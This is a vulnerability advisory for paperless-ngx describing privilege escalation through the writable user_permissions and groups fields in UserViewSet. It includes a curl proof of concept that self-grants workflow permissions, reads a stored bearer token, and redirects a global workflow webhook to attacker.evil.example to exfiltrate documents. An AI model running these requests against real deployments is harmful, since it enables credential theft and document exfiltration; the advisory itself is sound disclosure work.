Title: Privilege escalation via unrestricted user_permissions and groups in UserViewSet (incomplete fix of the superuser-bypass advisory)

Package: paperless-ngx (paperless app). Affected files: src/paperless/views.py, src/paperless/serialisers.py

Affected Versions: confirmed on v2.20.15 (commit 05e48b2). Present in all releases since the GHSA-59xh-5vwx-4c4q fix that only guards is_superuser/is_staff.

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N

CWE: CWE-269 (Improper Privilege Management) / CWE-863 (Incorrect Authorization)


### Summary

A non-superuser who holds the delegated `auth.change_user` (or `auth.add_user`) permission can grant themselves, or any other account, any non-admin permission or group membership in the system by editing the writable `user_permissions` and `groups` fields through the user API. The recent fix for the superuser-bypass advisory added checks that stop a non-superuser from setting `is_superuser` or `is_staff`, but it left the permission and group fields completely unrestricted. A delegated user-manager (the same role the advisory describes as "commonly granted for user onboarding in multi-user deployments") can therefore self-assign capabilities they were never delegated, including the ability to read and tamper with global workflows that store webhook and email credentials, and to redirect a workflow so that every newly consumed document is exfiltrated to an attacker-controlled URL.

### Details

`UserViewSet` only blocks the two boolean flags:

`src/paperless/views.py:132-181`
```python
def create(self, request, *args, **kwargs):
    requested_is_superuser = self._parse_requested_bool(request.data, "is_superuser")
    requested_is_staff = self._parse_requested_bool(request.data, "is_staff")
    if not request.user.is_superuser:
        if requested_is_superuser is True:
            return HttpResponseForbidden("Superuser status can only be granted by a superuser")
        if requested_is_staff is True:
            return HttpResponseForbidden("Staff status can only be granted by a superuser")
    return super().create(request, *args, **kwargs)

def update(self, request, *args, **kwargs):
    user_to_update: User = self.get_object()
    if not request.user.is_superuser and user_to_update.is_superuser:
        return HttpResponseForbidden("Superusers can only be modified by other superusers")
    requested_is_superuser = self._parse_requested_bool(request.data, "is_superuser")
    requested_is_staff = self._parse_requested_bool(request.data, "is_staff")
    if (not request.user.is_superuser and requested_is_superuser is not self._BOOL_NOT_PROVIDED
            and requested_is_superuser != user_to_update.is_superuser):
        return HttpResponseForbidden("Superuser status can only be changed by a superuser")
    if (not request.user.is_superuser and requested_is_staff is not self._BOOL_NOT_PROVIDED
            and requested_is_staff != user_to_update.is_staff):
        return HttpResponseForbidden("Staff status can only be changed by a superuser")
    return super().update(request, *args, **kwargs)
```

The serializer exposes `user_permissions` and `groups` as writable fields with no restriction limiting the assignable set to permissions/groups the requesting user already holds:

`src/paperless/serialisers.py:71-103`
```python
class UserSerializer(PasswordValidationMixin, serializers.ModelSerializer):
    password = ObfuscatedPasswordField(required=False)
    user_permissions = serializers.SlugRelatedField(
        many=True,
        queryset=Permission.objects.exclude(content_type__app_label="admin"),
        slug_field="codename",
        required=False,
    )
    ...
    class Meta:
        model = User
        fields = (
            "id", "username", "email", "password", "first_name", "last_name",
            "date_joined", "is_staff", "is_active", "is_superuser",
            "groups", "user_permissions", "inherited_permissions", "is_mfa_enabled",
        )
```

The only filter on `user_permissions` is `exclude(content_type__app_label="admin")`, which removes Django admin permissions but leaves every Paperless application permission assignable (`documents.*`, `paperless_mail.*`, `auth.*`, etc.). `groups` has no filter at all. Object-level authorization does not help here: `User` has no `owner` attribute, so `PaperlessObjectPermissions.has_object_permission` returns `True` for any user holding the model-level `auth.change_user`, and that user can edit every account.

Why the escalation has real impact even though documents are object-filtered:

- The document list/detail endpoints additionally enforce `ObjectOwnedOrGrantedPermissionsFilter`, so self-granting `documents.view_document` does not by itself reveal other users' documents.
- However, several sensitive resources are gated by the MODEL permission only and are NOT object-filtered. Workflows are global objects with no owner. Self-granting `documents.view_workflow` exposes every workflow, including the webhook and email action records, which store outbound URLs, request bodies, and arbitrary HTTP headers (`src/documents/models.py` WorkflowActionWebhook / WorkflowActionEmail). These headers commonly carry `Authorization` bearer tokens or API keys.
- Self-granting `documents.change_workflow` or `documents.add_workflow` lets the attacker rewrite or create a global workflow. By pointing a workflow webhook action at an attacker host and setting `include_document=True`, the attacker causes every newly consumed document to be POSTed to the attacker, a full document exfiltration channel and integrity compromise.

### PoC

Tested against the official image `paperlessngx/paperless-ngx:2.20.15`.

Setup (admin one-time, models a normal multi-user deployment):
- A delegated user-manager account `attacker` holding ONLY `auth.add_user`, `auth.change_user`, `auth.view_user` (no document, workflow, or mail permissions). User id 5 below.
- A global workflow (id 2) created by an admin whose webhook action carries a secret header `Authorization: Bearer SECRET-WEBHOOK-TOKEN-abc123XYZ`.

Exploit as `attacker` over HTTP:

```bash
B=http://SERVER:8000
# 1. Authenticate as the delegated user-manager
TOK=$(curl -s -X POST $B/api/token/ -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"attackerpass123"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# 2. Baseline: attacker cannot read workflows
curl -s -o /dev/null -w "GET /api/workflows/ -> %{http_code}\n" \
  $B/api/workflows/ -H "Authorization: Token $TOK"
# -> 403

# 3. Escalate: self-grant view_workflow + change_workflow by editing own user record
curl -s -X PATCH $B/api/users/5/ -H "Authorization: Token $TOK" \
  -H "Content-Type: application/json" \
  -d '{"user_permissions":["add_user","change_user","view_user","view_workflow","change_workflow"]}' \
  -w "\nPATCH -> %{http_code}\n" -o /dev/null
# -> 200 ; is_superuser and is_staff remain false

# 4. Confidentiality: read the global workflow's secret webhook header
curl -s $B/api/workflows/ -H "Authorization: Token $TOK"
# -> 200, returns:
#   webhook url: http://internal-backup.local/ingest
#   headers: {"Authorization": "Bearer SECRET-WEBHOOK-TOKEN-abc123XYZ"}

# 5. Integrity: redirect the global workflow to exfiltrate every consumed document
WF=$(curl -s $B/api/workflows/2/ -H "Authorization: Token $TOK")
python3 - "$WF" <<'PY' > mod.json
import sys,json
wf=json.loads(sys.argv[1])
wf['actions'][0]['webhook']['url']="http://attacker.evil.example/steal"
wf['actions'][0]['webhook']['include_document']=True
print(json.dumps(wf))
PY
curl -s -X PUT $B/api/workflows/2/ -H "Authorization: Token $TOK" \
  -H "Content-Type: application/json" -d @mod.json -w "\nPUT -> %{http_code}\n" -o /dev/null
# -> 200 ; the global workflow now POSTs every newly consumed document to attacker.evil.example
```

Observed live results:
- Step 2: `GET /api/workflows/ -> 403`
- Step 3: `PATCH -> 200`, and `GET /api/users/5/` shows `is_superuser: False, is_staff: False, user_permissions: ['add_user','change_user','view_user','view_workflow','change_workflow']`
- Step 4: `200`, headers `{"Authorization": "Bearer SECRET-WEBHOOK-TOKEN-abc123XYZ"}` returned
- Step 5: `PUT -> 200`, workflow webhook url now `http://attacker.evil.example/steal`, `include_document=True`

### Impact

This is a privilege escalation (CWE-269 / CWE-863) and an incomplete fix of the earlier UserViewSet superuser-bypass advisory. Any non-superuser holding the delegated `auth.add_user` or `auth.change_user` permission, a role the upstream advisory itself describes as commonly delegated for user onboarding, can:

- Self-assign any non-admin permission or join any group, gaining capabilities never delegated to them.
- Read credentials stored in global workflow webhook and email actions (Authorization headers, API keys, internal endpoints).
- Tamper with or create global workflows, including redirecting a webhook to an attacker host with `include_document=True`, which exfiltrates every newly consumed document.

The escalation works against the attacker's own account or any other account, since user objects are not object-scoped. The superuser/staff flags remain protected, but the permission and group fields provide an equivalent path to broad confidentiality and integrity compromise in multi-user deployments.
